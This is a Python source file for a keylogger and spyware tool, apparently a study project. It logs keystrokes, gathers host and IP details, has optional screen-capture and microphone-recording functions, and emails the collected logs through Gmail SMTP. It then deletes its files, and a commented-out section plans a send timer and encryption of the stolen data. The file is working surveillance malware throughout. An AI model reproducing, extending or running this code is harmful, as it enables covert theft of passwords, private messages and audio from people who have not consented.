import os
import sys

import datetime
import platform
import smtplib
import socket
import sounddevice as sd

from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write


path = os.getcwd() + "/"

audio_info = "audio_info.wav"
audio_file_path = path + audio_info
keys_info = "key_log.txt"
keys_file_path = path + keys_info
screen_info = "screen_info.png"
screen_file_path = path + screen_info
sys_info = "sys_info.txt"
sys_file_path = path + sys_info


# GET COMPUTER INFO
def get_system_info():
    with open(sys_file_path, "a") as f:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception as e:
            f.write("Could not get Public IP Address")
            raise e

        f.write("Private IP Address: " + private_ip + "\n")
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")

        print("system info owned")


# GET AUDIO
def get_audio():
    # Set sampling frequency
    fs = 44100
    recorded_time = 10 # seconds

    record = sd.rec(int(recorded_time * fs), samplerate=fs, channels=2)
    sd.wait()
    print("it's listening")

    write(audio_file_path, fs, record)
    print("audio owned")


# GET SCREEN
def get_screenshot():
    im = ImageGrab.grab()
    im.save(screen_file_path)
    print("screen owned")


# GET KEYS INFO
def on_press(key):
    keys = []
    keys.append(key)
    write_file(keys)


def write_file(keys):
    with open(keys_file_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")

            if k.find("enter") > 0:
                f.write("\n")

            if k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

except Exception as e:
    print("could not get keys info")
    raise e


# EMAIL
def send_email(subject, filename, file_path, email, password):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = subject

    date = str(datetime.datetime.now())
    body = "Log file from: " + date
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(file_path, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()

    s.login(email, password)

    text = msg.as_string()

    s.sendmail(email, email, text)
    print('email sent')

    s.quit()


# DELETE FILES
def remove_files():
    delete_files = [sys_info, keys_info, screen_info, audio_info] # TO DO: deletar tudo da pasta inclusive o script
    for file in delete_files:
        os.remove(path + file)
    print("files removed")


get_system_info()
# get_audio()
# get_screenshot()

send_email("system information", sys_info, sys_file_path, sys.argv[1], sys.argv[2])
send_email("keylogger", keys_info, keys_file_path, sys.argv[1], sys.argv[2])
# send_email("screenshot", screen_info, sys_file_path, sys.argv[1], sys.argv[2])
# send_email("audio", audio_info, sys_file_path, sys.argv[1], sys.argv[2])

remove_files()













"""

# THINGS TO WORK ON

####################### CREATE TIMER

import time
from sys import argv

start = time.time()
seconds = float(argv[1])

while True:
    current_time = time.time()
    elapsed_time = current_time - start

    if elapsed_time > seconds:
        # send_email(keys_info, keys_file_path, argv[2], argv[3])
        print("time is up")

        #w with open(keys_file_path, "w") as f:
        #    f.write(" ")

        break



######################## ENCRYPT TEXT DATA

from cryptography.fernet import Fernet

path_to_file = "/home/fcs/Documentos/study/Keylogger_in_python/Project/"

encrypted_keys_info = "e_keys_info.txt"
encrypted_system_info = "e_sys_info.txt"

files_to_encrypt = [keys_file_path, sys_file_path]
encrypted_files = [path_to_file + encrypted_keys_info, path_to_file + encrypted_system_info]


e_key = "qRzC5oUZmt0YI1O2Du-22g2tdy1xy5hfVKe0bDhiWRU="


for index, file in enumerate(files_to_encrypt):
    with open(files_to_encrypt[index], "rb") as f:
        data = f.read()

    fernet = Fernet(e_key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_files[index], "wb") as f:
        f.write(encrypted_data)

    send_email(encrypted_files[index], encrypted_files[index], argv[2], argv[3])


time.sleep(120)

"""
